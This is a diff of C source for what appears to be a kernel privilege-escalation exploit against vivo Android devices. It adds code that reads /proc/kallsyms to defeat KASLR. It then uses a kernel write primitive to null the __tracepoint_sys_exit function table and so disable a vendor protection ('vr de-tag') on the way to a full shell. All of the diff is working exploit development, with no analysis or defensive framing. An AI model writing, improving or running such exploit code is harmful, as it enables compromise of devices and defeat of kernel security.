@@ -127,8 +127,13 @@ static int g_timer_go_r = -1, g_timer_go_w = -1;
 static int g_cpu = CPU_TRIG;
 static unsigned long long g_base;
 static unsigned long long g_rel_static, g_rel_off;
+/* Runtime symbols from /proc/kallsyms, when the shell domain can read them.
+ * vivo normally masks the addresses (kptr_restrict), but when it does not
+ * this removes every per-build constant from the de-tag step. */
+static unsigned long long g_text_runtime, g_tp_runtime, g_selinux_runtime;
 static int g_rel_mode;
 static unsigned long long g_slide;
+static unsigned long long g_rel_abs;
 static int g_held;
 static int g_fake_stage;
 static int g_full_shell;
@@ -1411,20 +1416,68 @@ __attribute__((unused)) static int stage_write(unsigned long long target, int mo
  * corrupt an unrelated kernel pointer, so this is the one place in the chain
  * where an offset error is not merely "the plant missed".
  */
+/* Read the handful of symbols the chain needs straight out of
+ * /proc/kallsyms.  Masked addresses (all zeros) are treated as absent. */
+static void read_kallsyms(void)
+{
+    FILE *f = fopen("/proc/kallsyms", "r");
+    char line[256];
+    char name[160];
+    unsigned long long a;
+    char t;
+
+    if (!f)
+    {
+        logf("[ksym] /proc/kallsyms unavailable\n");
+        return;
+    }
+    while (fgets(line, sizeof(line), f))
+    {
+        if (sscanf(line, "%llx %c %159s", &a, &t, name) != 3 || !a)
+            continue;
+        if (!strcmp(name, "_text") && !g_text_runtime)
+            g_text_runtime = a;
+        else if (!strcmp(name, "__tracepoint_sys_exit") && !g_tp_runtime)
+            g_tp_runtime = a;
+        else if (!strcmp(name, "selinux_state") && !g_selinux_runtime)
+            g_selinux_runtime = a;
+    }
+    fclose(f);
+    logf("[ksym] _text=%#llx tp_sys_exit=%#llx selinux_state=%#llx\n",
+         g_text_runtime, g_tp_runtime, g_selinux_runtime);
+}
+
 static int defeat_vr(unsigned long long task, unsigned char *raw)
 {
     (void)task;
     (void)raw;
 
-    if (!g_slide)
     {
-        logf("[-] vr: no KASLR slide for sys_exit.funcs\n");
-        return -1;
+        unsigned long long tp = 0;
+
+        if (g_tp_runtime)
+            tp = g_tp_runtime;              /* kallsyms: absolute */
+        else if (g_static_ok && g_slide)
+            tp = TP_STATIC + g_slide;       /* profile + measured slide */
+        if (!tp)
+        {
+            logf("[-] vr: no __tracepoint_sys_exit address for this build\n");
+            return -1;
+        }
+        logf("[+] vr: nulling __tracepoint_sys_exit.funcs at %#llx\n",
+             tp + TP_FUNCS_OFF);
+        if (g_tp_runtime)
+        {
+            g_rel_mode = 2;
+            g_rel_abs = tp + TP_FUNCS_OFF;
+        }
+        else
+        {
+            g_rel_mode = 1;
+            g_rel_static = TP_STATIC;
+            g_rel_off = TP_FUNCS_OFF;
+        }
     }
-    logf("[+] vr: nulling __tracepoint_sys_exit.funcs\n");
-    g_rel_mode = 1;
-    g_rel_static = TP_STATIC;
-    g_rel_off = TP_FUNCS_OFF;
     if (stage_write_retry(0, 0, "vr_sys_exit_funcs", raw, 3, NULL))
     {
         logf("[-] vr: sys_exit.funcs write failed\n");
@@ -1699,13 +1752,12 @@ static void run_plant(unsigned long long target, int tag, int mode,
     if (g_static_ok)
         g_slide = site0 -
                   (g_timer_site_kind ? STATIC_TIMER_SITE_2 : STATIC_TIMER_SITE);
-    else
-        g_slide = 0;
+    /* otherwise keep the kallsyms-derived slide, if read_kallsyms() got one */
 
     /* KASLR text slides are 2 MiB aligned and well under 16 GiB.  An
      * implausible value means the captured call site belongs to another
      * build (low21 collision); stop before any write. */
-    if (g_static_ok && ((g_slide & 0x1fffffULL) || g_slide > 0x400000000ULL))
+    if (g_slide && ((g_slide & 0x1fffffULL) || g_slide > 0x8000000000ULL))
     {
         logf("[-] plant%d implausible slide %#llx (site=%#llx); refusing\n",
              tag, g_slide, site0);
@@ -1714,7 +1766,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
         kill_target_group(T);
         return;
     }
-    if (g_rel_mode)
+    if (g_rel_mode == 2)
+        target = g_rel_abs;
+    else if (g_rel_mode)
         target = g_rel_static + g_slide + g_rel_off;
 
     {
@@ -2350,6 +2404,20 @@ int main(int argc, char **argv)
             return 1;
         }
     }
+
+    read_kallsyms();
+    if (g_text_runtime)
+    {
+        unsigned long long sl = g_text_runtime - 0xffffffc008000000ULL;
+
+        if (!(sl & 0x1fffffULL) && sl < 0x8000000000ULL)
+        {
+            g_slide = sl;
+            logf("[ksym] slide=%#llx from _text\n", sl);
+        }
+        else
+            logf("[ksym] implausible _text slide %#llx; ignoring\n", sl);
+    }
     if (argc > 1 && !strcmp(argv[1], "wait"))
         return wait_child_main(argc > 2 ? argv[2] : "verify");
 
@@ -2500,14 +2568,14 @@ int main(int argc, char **argv)
         }
         if (!verified)
             park_forever("no verified plant");
-        if (g_child_task && g_static_ok)
+        if (g_child_task && (g_static_ok || g_tp_runtime))
         {
             if (defeat_vr(g_child_task, raw))
                 park_forever("shell vr de-tag failed");
         }
         else
             logf("[-] shell vr de-tag skipped: %s\n",
-                 g_child_task ? "no profile match for the tp address"
+                 g_child_task ? "no __tracepoint_sys_exit address for this build"
                               : "child task not leaked");
     }
     else
